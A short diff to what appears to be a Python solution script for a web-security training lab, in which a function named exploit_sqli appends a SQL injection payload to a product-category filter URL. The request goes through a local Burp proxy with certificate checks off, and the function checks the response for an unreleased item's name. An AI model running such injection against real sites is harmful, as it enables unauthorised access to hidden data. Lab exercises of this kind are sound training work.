@@ -16,8 +16,10 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 
 def exploit_sqli(url, payload):
-    uri = '/filter?category=G'
+    uri = '/filter?category=Gifts'
+    # The GET request, ignoring the TLS certificate and routing through Burpsuite
     r = requests.get(url + uri + payload, verify=False, proxies=proxies)
+    # Looks for a string that only appears when unreleased items are listed.
     if "Beat the Vacation Traffic" in r.text:
         return True
     else:
